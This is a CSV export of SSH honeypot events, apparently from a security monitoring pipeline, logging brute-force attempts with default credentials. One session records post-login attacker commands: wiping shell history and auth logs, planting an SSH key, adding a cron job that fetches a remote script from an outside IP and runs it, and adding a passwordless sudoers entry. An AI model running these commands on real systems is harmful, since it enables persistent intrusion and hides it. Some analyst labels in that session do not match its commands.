event_id,session_id,timestamp,event_type,honeypot_id,src_ip,src_port,dst_ip,dst_port,protocol,username,password,login_success,command,command_index,country,asn,isp,attack_type,mitre_technique_id,mitre_technique_name,severity,file_downloaded,c2_ip,sha256_payload,session_duration_sec,bytes_sent,bytes_received,alert_tag,false_positive,thehive_case_id,misp_event_uuid,analyst_note
EVT-0000082,a08d08e468fa,2026-03-03T05:32:42.423Z,cowrie.login.failed,cowrie-ec2-prod-01,199.65.106.248,40505,172.18.0.3,2222,ssh,centos,password,false,,,CN,AS9808,China Mobile,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,,43a0dfdc-2059-4b9e-bd23-c8559d3f475f,
EVT-0000083,a08d08e468fa,2026-03-03T05:32:43.749Z,cowrie.login.failed,cowrie-ec2-prod-01,199.65.106.248,40505,172.18.0.3,2222,ssh,guest,P@ssw0rd,false,,,CN,AS9808,China Mobile,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,,43a0dfdc-2059-4b9e-bd23-c8559d3f475f,
EVT-0000084,a08d08e468fa,2026-03-03T05:32:47.820Z,cowrie.session.closed,cowrie-ec2-prod-01,199.65.106.248,40505,172.18.0.3,2222,ssh,guest,P@ssw0rd,false,,,CN,AS9808,China Mobile,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,25,701,708,bruteforce,false,,43a0dfdc-2059-4b9e-bd23-c8559d3f475f,
EVT-0000085,0dc9875409e0,2026-03-16T17:46:35.000Z,cowrie.session.connect,cowrie-ec2-prod-01,232.5.138.245,51222,172.18.0.3,2222,ssh,,,,,,BR,AS28573,Claro NXT Telecomunicacoes,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,1c0b800d-3a89-4597-b4cf-bd2b3689aeb5,Low-and-slow credential stuffing
EVT-0000086,0dc9875409e0,2026-03-16T17:46:35.489Z,cowrie.client.version,cowrie-ec2-prod-01,232.5.138.245,51222,172.18.0.3,2222,ssh,,,,,,BR,AS28573,Claro NXT Telecomunicacoes,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,1c0b800d-3a89-4597-b4cf-bd2b3689aeb5,Low-and-slow credential stuffing
EVT-0000087,0dc9875409e0,2026-03-16T17:46:35.861Z,cowrie.client.kex,cowrie-ec2-prod-01,232.5.138.245,51222,172.18.0.3,2222,ssh,,,,,,BR,AS28573,Claro NXT Telecomunicacoes,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,1c0b800d-3a89-4597-b4cf-bd2b3689aeb5,Low-and-slow credential stuffing
EVT-0000088,0dc9875409e0,2026-03-16T17:46:37.399Z,cowrie.login.failed,cowrie-ec2-prod-01,232.5.138.245,51222,172.18.0.3,2222,ssh,postgres,12345,false,,,BR,AS28573,Claro NXT Telecomunicacoes,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,1c0b800d-3a89-4597-b4cf-bd2b3689aeb5,Low-and-slow credential stuffing
EVT-0000089,0dc9875409e0,2026-03-16T17:46:39.840Z,cowrie.login.failed,cowrie-ec2-prod-01,232.5.138.245,51222,172.18.0.3,2222,ssh,db,P@ssw0rd,false,,,BR,AS28573,Claro NXT Telecomunicacoes,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,1c0b800d-3a89-4597-b4cf-bd2b3689aeb5,Low-and-slow credential stuffing
EVT-0000090,0dc9875409e0,2026-03-16T17:46:40.798Z,cowrie.login.failed,cowrie-ec2-prod-01,232.5.138.245,51222,172.18.0.3,2222,ssh,jenkins,admin123,false,,,BR,AS28573,Claro NXT Telecomunicacoes,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,1c0b800d-3a89-4597-b4cf-bd2b3689aeb5,Low-and-slow credential stuffing
EVT-0000091,0dc9875409e0,2026-03-16T17:46:43.007Z,cowrie.login.failed,cowrie-ec2-prod-01,232.5.138.245,51222,172.18.0.3,2222,ssh,admin,mysql,false,,,BR,AS28573,Claro NXT Telecomunicacoes,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,1c0b800d-3a89-4597-b4cf-bd2b3689aeb5,Low-and-slow credential stuffing
EVT-0000092,0dc9875409e0,2026-03-16T17:46:45.473Z,cowrie.login.failed,cowrie-ec2-prod-01,232.5.138.245,51222,172.18.0.3,2222,ssh,administrator,changeme,false,,,BR,AS28573,Claro NXT Telecomunicacoes,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,1c0b800d-3a89-4597-b4cf-bd2b3689aeb5,Low-and-slow credential stuffing
EVT-0000093,0dc9875409e0,2026-03-16T17:46:46.014Z,cowrie.login.failed,cowrie-ec2-prod-01,232.5.138.245,51222,172.18.0.3,2222,ssh,jenkins,password,false,,,BR,AS28573,Claro NXT Telecomunicacoes,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,1c0b800d-3a89-4597-b4cf-bd2b3689aeb5,Low-and-slow credential stuffing
EVT-0000094,0dc9875409e0,2026-03-16T17:46:47.866Z,cowrie.login.failed,cowrie-ec2-prod-01,232.5.138.245,51222,172.18.0.3,2222,ssh,pi,1234,false,,,BR,AS28573,Claro NXT Telecomunicacoes,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,1c0b800d-3a89-4597-b4cf-bd2b3689aeb5,Low-and-slow credential stuffing
EVT-0000095,0dc9875409e0,2026-03-16T17:46:49.420Z,cowrie.session.closed,cowrie-ec2-prod-01,232.5.138.245,51222,172.18.0.3,2222,ssh,pi,1234,false,,,BR,AS28573,Claro NXT Telecomunicacoes,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,15,1280,744,bruteforce,false,,1c0b800d-3a89-4597-b4cf-bd2b3689aeb5,Low-and-slow credential stuffing
EVT-0000096,b7816cd76479,2026-04-20T12:44:02.000Z,cowrie.session.connect,cowrie-ec2-prod-01,23.214.45.142,41245,172.18.0.3,2222,ssh,,,,,,TW,AS3462,Data Communication Business Group,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0000097,b7816cd76479,2026-04-20T12:44:02.188Z,cowrie.client.version,cowrie-ec2-prod-01,23.214.45.142,41245,172.18.0.3,2222,ssh,,,,,,TW,AS3462,Data Communication Business Group,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0000098,b7816cd76479,2026-04-20T12:44:02.745Z,cowrie.client.kex,cowrie-ec2-prod-01,23.214.45.142,41245,172.18.0.3,2222,ssh,,,,,,TW,AS3462,Data Communication Business Group,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0000099,b7816cd76479,2026-04-20T12:44:05.622Z,cowrie.login.failed,cowrie-ec2-prod-01,23.214.45.142,41245,172.18.0.3,2222,ssh,administrator,admin@123,false,,,TW,AS3462,Data Communication Business Group,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0000100,b7816cd76479,2026-04-20T12:44:08.194Z,cowrie.login.failed,cowrie-ec2-prod-01,23.214.45.142,41245,172.18.0.3,2222,ssh,jenkins,linux,false,,,TW,AS3462,Data Communication Business Group,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0000101,b7816cd76479,2026-04-20T12:44:09.553Z,cowrie.login.failed,cowrie-ec2-prod-01,23.214.45.142,41245,172.18.0.3,2222,ssh,support,alpine,false,,,TW,AS3462,Data Communication Business Group,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0000102,b7816cd76479,2026-04-20T12:44:12.390Z,cowrie.session.closed,cowrie-ec2-prod-01,23.214.45.142,41245,172.18.0.3,2222,ssh,support,alpine,false,,,TW,AS3462,Data Communication Business Group,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,8,1734,835,bruteforce,false,,,
EVT-0000103,e8e95f3481ca,2026-03-16T08:51:08.000Z,cowrie.session.connect,cowrie-ec2-prod-01,208.121.229.202,62066,172.18.0.3,2222,ssh,,,,,,TH,AS23969,TOT Public Company Limited,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,
EVT-0000104,e8e95f3481ca,2026-03-16T08:51:08.355Z,cowrie.client.version,cowrie-ec2-prod-01,208.121.229.202,62066,172.18.0.3,2222,ssh,,,,,,TH,AS23969,TOT Public Company Limited,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,
EVT-0000105,e8e95f3481ca,2026-03-16T08:51:08.530Z,cowrie.client.kex,cowrie-ec2-prod-01,208.121.229.202,62066,172.18.0.3,2222,ssh,,,,,,TH,AS23969,TOT Public Company Limited,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,
EVT-0000106,e8e95f3481ca,2026-03-16T08:51:10.816Z,cowrie.login.failed,cowrie-ec2-prod-01,208.121.229.202,62066,172.18.0.3,2222,ssh,support,admin123,false,,,TH,AS23969,TOT Public Company Limited,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,
EVT-0000107,e8e95f3481ca,2026-03-16T08:51:12.649Z,cowrie.login.failed,cowrie-ec2-prod-01,208.121.229.202,62066,172.18.0.3,2222,ssh,guest,password,false,,,TH,AS23969,TOT Public Company Limited,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,
EVT-0000108,e8e95f3481ca,2026-03-16T08:51:13.260Z,cowrie.login.failed,cowrie-ec2-prod-01,208.121.229.202,62066,172.18.0.3,2222,ssh,backup,raspberry,false,,,TH,AS23969,TOT Public Company Limited,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,
EVT-0000109,e8e95f3481ca,2026-03-16T08:51:15.107Z,cowrie.login.failed,cowrie-ec2-prod-01,208.121.229.202,62066,172.18.0.3,2222,ssh,administrator,root123,false,,,TH,AS23969,TOT Public Company Limited,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,
EVT-0000110,e8e95f3481ca,2026-03-16T08:51:15.869Z,cowrie.login.failed,cowrie-ec2-prod-01,208.121.229.202,62066,172.18.0.3,2222,ssh,git,oracle,false,,,TH,AS23969,TOT Public Company Limited,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,
EVT-0000111,e8e95f3481ca,2026-03-16T08:51:16.723Z,cowrie.login.failed,cowrie-ec2-prod-01,208.121.229.202,62066,172.18.0.3,2222,ssh,backup,12345678,false,,,TH,AS23969,TOT Public Company Limited,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,
EVT-0000112,e8e95f3481ca,2026-03-16T08:51:18.768Z,cowrie.session.closed,cowrie-ec2-prod-01,208.121.229.202,62066,172.18.0.3,2222,ssh,backup,12345678,false,,,TH,AS23969,TOT Public Company Limited,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,14,1566,1221,bruteforce,false,,,
EVT-0000113,22182a533ec6,2026-04-07T17:31:52.000Z,cowrie.session.connect,cowrie-ec2-prod-01,42.230.74.76,57732,172.18.0.3,2222,ssh,,,,,,NL,AS1101,SURF B.V.,log_tampering,T1110.001,Brute Force: Password Guessing,critical,,,,,,,persistence,false,,,MongoDB credential extraction attempt
EVT-0000114,22182a533ec6,2026-04-07T17:31:52.306Z,cowrie.client.version,cowrie-ec2-prod-01,42.230.74.76,57732,172.18.0.3,2222,ssh,,,,,,NL,AS1101,SURF B.V.,log_tampering,T1110.001,Brute Force: Password Guessing,critical,,,,,,,persistence,false,,,MongoDB credential extraction attempt
EVT-0000115,22182a533ec6,2026-04-07T17:31:52.567Z,cowrie.client.kex,cowrie-ec2-prod-01,42.230.74.76,57732,172.18.0.3,2222,ssh,,,,,,NL,AS1101,SURF B.V.,log_tampering,T1110.001,Brute Force: Password Guessing,critical,,,,,,,persistence,false,,,MongoDB credential extraction attempt
EVT-0000116,22182a533ec6,2026-04-07T17:31:53.138Z,cowrie.login.failed,cowrie-ec2-prod-01,42.230.74.76,57732,172.18.0.3,2222,ssh,mysql,letmein,false,,,NL,AS1101,SURF B.V.,log_tampering,T1110.001,Brute Force: Password Guessing,critical,,,,,,,persistence,false,,,MongoDB credential extraction attempt
EVT-0000117,22182a533ec6,2026-04-07T17:31:55.307Z,cowrie.login.failed,cowrie-ec2-prod-01,42.230.74.76,57732,172.18.0.3,2222,ssh,oracle,oracle,false,,,NL,AS1101,SURF B.V.,log_tampering,T1110.001,Brute Force: Password Guessing,critical,,,,,,,persistence,false,,,MongoDB credential extraction attempt
EVT-0000118,22182a533ec6,2026-04-07T17:31:57.567Z,cowrie.login.success,cowrie-ec2-prod-01,42.230.74.76,57732,172.18.0.3,2222,ssh,webmaster,admin123,true,,,NL,AS1101,SURF B.V.,log_tampering,T1110.001,Brute Force: Password Guessing,critical,,,,,,,persistence,false,,,MongoDB credential extraction attempt
EVT-0000119,22182a533ec6,2026-04-07T17:32:05.809Z,cowrie.command.input,cowrie-ec2-prod-01,42.230.74.76,57732,172.18.0.3,2222,ssh,webmaster,admin123,true,hostname,0,NL,AS1101,SURF B.V.,log_tampering,T1110.001,Brute Force: Password Guessing,critical,,,,,,,persistence,false,,,MongoDB credential extraction attempt
EVT-0000120,22182a533ec6,2026-04-07T17:32:19.112Z,cowrie.command.input,cowrie-ec2-prod-01,42.230.74.76,57732,172.18.0.3,2222,ssh,webmaster,admin123,true,whoami,1,NL,AS1101,SURF B.V.,log_tampering,T1110.001,Brute Force: Password Guessing,critical,,,,,,,persistence,false,,,MongoDB credential extraction attempt
EVT-0000121,22182a533ec6,2026-04-07T17:32:37.392Z,cowrie.command.input,cowrie-ec2-prod-01,42.230.74.76,57732,172.18.0.3,2222,ssh,webmaster,admin123,true,export HISTFILESIZE=0,2,NL,AS1101,SURF B.V.,log_tampering,T1110.001,Brute Force: Password Guessing,critical,,,,,,,persistence,false,,,MongoDB credential extraction attempt
EVT-0000122,22182a533ec6,2026-04-07T17:32:48.251Z,cowrie.command.input,cowrie-ec2-prod-01,42.230.74.76,57732,172.18.0.3,2222,ssh,webmaster,admin123,true,export HISTSIZE=0,3,NL,AS1101,SURF B.V.,log_tampering,T1110.001,Brute Force: Password Guessing,critical,,,,,,,persistence,false,,,MongoDB credential extraction attempt
EVT-0000123,22182a533ec6,2026-04-07T17:33:02.238Z,cowrie.command.input,cowrie-ec2-prod-01,42.230.74.76,57732,172.18.0.3,2222,ssh,webmaster,admin123,true,rm -rf /var/log/auth.log,4,NL,AS1101,SURF B.V.,log_tampering,T1110.001,Brute Force: Password Guessing,critical,,,,,,,persistence,false,,,MongoDB credential extraction attempt
EVT-0000124,22182a533ec6,2026-04-07T17:33:14.358Z,cowrie.command.input,cowrie-ec2-prod-01,42.230.74.76,57732,172.18.0.3,2222,ssh,webmaster,admin123,true,unset HISTFILE,5,NL,AS1101,SURF B.V.,log_tampering,T1110.001,Brute Force: Password Guessing,critical,,,,,,,persistence,false,,,MongoDB credential extraction attempt
EVT-0000125,22182a533ec6,2026-04-07T17:33:30.159Z,cowrie.command.input,cowrie-ec2-prod-01,42.230.74.76,57732,172.18.0.3,2222,ssh,webmaster,admin123,true,echo 'ssh-rsa AAAA...attacker_key...== root@attacker' >> ~/.ssh/authorized_keys,6,NL,AS1101,SURF B.V.,log_tampering,T1110.001,Brute Force: Password Guessing,critical,,,,,,,persistence,false,,,MongoDB credential extraction attempt
EVT-0000126,22182a533ec6,2026-04-07T17:33:40.560Z,cowrie.command.input,cowrie-ec2-prod-01,42.230.74.76,57732,172.18.0.3,2222,ssh,webmaster,admin123,true,(crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://45.142.212.100/ping | bash') | crontab -,7,NL,AS1101,SURF B.V.,log_tampering,T1110.001,Brute Force: Password Guessing,critical,backdoor.elf,185.191.127.231,var/lib/cowrie/downloads/fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9,,,,persistence,false,,,MongoDB credential extraction attempt
EVT-0000127,22182a533ec6,2026-04-07T17:33:47.735Z,cowrie.command.input,cowrie-ec2-prod-01,42.230.74.76,57732,172.18.0.3,2222,ssh,webmaster,admin123,true,echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,8,NL,AS1101,SURF B.V.,log_tampering,T1110.001,Brute Force: Password Guessing,critical,,,,,,,persistence,false,,,MongoDB credential extraction attempt
EVT-0000128,22182a533ec6,2026-04-07T17:33:55.037Z,cowrie.command.input,cowrie-ec2-prod-01,42.230.74.76,57732,172.18.0.3,2222,ssh,webmaster,admin123,true,exit,9,NL,AS1101,SURF B.V.,log_tampering,T1110.001,Brute Force: Password Guessing,critical,,,,,,,persistence,false,,,MongoDB credential extraction attempt
EVT-0000129,22182a533ec6,2026-04-07T17:33:58.009Z,cowrie.session.closed,cowrie-ec2-prod-01,42.230.74.76,57732,172.18.0.3,2222,ssh,webmaster,admin123,true,,,NL,AS1101,SURF B.V.,log_tampering,T1110.001,Brute Force: Password Guessing,critical,,,,751,86620,56480,persistence,false,,,MongoDB credential extraction attempt
EVT-0000130,badb501f12f6,2026-04-27T06:28:51.000Z,cowrie.session.connect,cowrie-ec2-prod-01,51.206.118.57,62582,172.18.0.3,2222,ssh,,,,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000131,badb501f12f6,2026-04-27T06:28:51.147Z,cowrie.client.version,cowrie-ec2-prod-01,51.206.118.57,62582,172.18.0.3,2222,ssh,,,,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000132,badb501f12f6,2026-04-27T06:28:51.486Z,cowrie.client.kex,cowrie-ec2-prod-01,51.206.118.57,62582,172.18.0.3,2222,ssh,,,,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000133,badb501f12f6,2026-04-27T06:28:53.348Z,cowrie.login.failed,cowrie-ec2-prod-01,51.206.118.57,62582,172.18.0.3,2222,ssh,support,test,false,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000134,badb501f12f6,2026-04-27T06:28:54.677Z,cowrie.login.failed,cowrie-ec2-prod-01,51.206.118.57,62582,172.18.0.3,2222,ssh,ftp,passw0rd,false,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000135,badb501f12f6,2026-04-27T06:28:57.108Z,cowrie.login.failed,cowrie-ec2-prod-01,51.206.118.57,62582,172.18.0.3,2222,ssh,mysql,linux,false,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000136,badb501f12f6,2026-04-27T06:28:59.043Z,cowrie.login.failed,cowrie-ec2-prod-01,51.206.118.57,62582,172.18.0.3,2222,ssh,ftp,111111,false,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000137,badb501f12f6,2026-04-27T06:28:59.597Z,cowrie.login.failed,cowrie-ec2-prod-01,51.206.118.57,62582,172.18.0.3,2222,ssh,administrator,123456789,false,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000138,badb501f12f6,2026-04-27T06:29:00.939Z,cowrie.login.failed,cowrie-ec2-prod-01,51.206.118.57,62582,172.18.0.3,2222,ssh,service,iloveyou,false,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000139,badb501f12f6,2026-04-27T06:29:03.820Z,cowrie.login.failed,cowrie-ec2-prod-01,51.206.118.57,62582,172.18.0.3,2222,ssh,redis,libreelec,false,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000140,badb501f12f6,2026-04-27T06:29:05.989Z,cowrie.login.failed,cowrie-ec2-prod-01,51.206.118.57,62582,172.18.0.3,2222,ssh,webmaster,iloveyou,false,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000141,badb501f12f6,2026-04-27T06:29:08.686Z,cowrie.session.closed,cowrie-ec2-prod-01,51.206.118.57,62582,172.18.0.3,2222,ssh,webmaster,iloveyou,false,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,19,2316,529,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000142,6982da7376f0,2026-03-25T11:36:28.000Z,cowrie.session.connect,cowrie-ec2-prod-01,16.236.102.186,45667,172.18.0.3,2222,ssh,,,,,,CN,AS4134,ChinaNet,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,HIVE-7793,,Low-and-slow credential stuffing
EVT-0000143,6982da7376f0,2026-03-25T11:36:28.402Z,cowrie.client.version,cowrie-ec2-prod-01,16.236.102.186,45667,172.18.0.3,2222,ssh,,,,,,CN,AS4134,ChinaNet,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,HIVE-7793,,Low-and-slow credential stuffing
EVT-0000144,6982da7376f0,2026-03-25T11:36:29.074Z,cowrie.client.kex,cowrie-ec2-prod-01,16.236.102.186,45667,172.18.0.3,2222,ssh,,,,,,CN,AS4134,ChinaNet,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,HIVE-7793,,Low-and-slow credential stuffing
EVT-0000145,6982da7376f0,2026-03-25T11:36:31.523Z,cowrie.login.failed,cowrie-ec2-prod-01,16.236.102.186,45667,172.18.0.3,2222,ssh,operator,password,false,,,CN,AS4134,ChinaNet,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,HIVE-7793,,Low-and-slow credential stuffing
EVT-0000146,6982da7376f0,2026-03-25T11:36:32.715Z,cowrie.login.failed,cowrie-ec2-prod-01,16.236.102.186,45667,172.18.0.3,2222,ssh,vagrant,oracle,false,,,CN,AS4134,ChinaNet,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,HIVE-7793,,Low-and-slow credential stuffing
EVT-0000147,6982da7376f0,2026-03-25T11:36:34.604Z,cowrie.login.failed,cowrie-ec2-prod-01,16.236.102.186,45667,172.18.0.3,2222,ssh,manager,ubuntu,false,,,CN,AS4134,ChinaNet,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,HIVE-7793,,Low-and-slow credential stuffing
EVT-0000148,6982da7376f0,2026-03-25T11:36:37.026Z,cowrie.login.failed,cowrie-ec2-prod-01,16.236.102.186,45667,172.18.0.3,2222,ssh,nagios,mysql,false,,,CN,AS4134,ChinaNet,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,HIVE-7793,,Low-and-slow credential stuffing
EVT-0000149,6982da7376f0,2026-03-25T11:36:39.982Z,cowrie.login.failed,cowrie-ec2-prod-01,16.236.102.186,45667,172.18.0.3,2222,ssh,ftp,linux,false,,,CN,AS4134,ChinaNet,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,HIVE-7793,,Low-and-slow credential stuffing
EVT-0000150,6982da7376f0,2026-03-25T11:36:44.754Z,cowrie.session.closed,cowrie-ec2-prod-01,16.236.102.186,45667,172.18.0.3,2222,ssh,ftp,linux,false,,,CN,AS4134,ChinaNet,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,6,1551,549,bruteforce,false,HIVE-7793,,Low-and-slow credential stuffing
EVT-0000151,ad656b3a0263,2026-04-27T04:36:39.000Z,cowrie.session.connect,cowrie-ec2-prod-01,173.43.180.80,42761,172.18.0.3,2222,ssh,,,,,,TH,AS23969,TOT Public Company Limited,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,,44da1c9e-8df9-4a98-8ddc-39b46a6db051,Automated SSH dictionary attack
EVT-0000152,ad656b3a0263,2026-04-27T04:36:39.393Z,cowrie.client.version,cowrie-ec2-prod-01,173.43.180.80,42761,172.18.0.3,2222,ssh,,,,,,TH,AS23969,TOT Public Company Limited,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,,44da1c9e-8df9-4a98-8ddc-39b46a6db051,Automated SSH dictionary attack
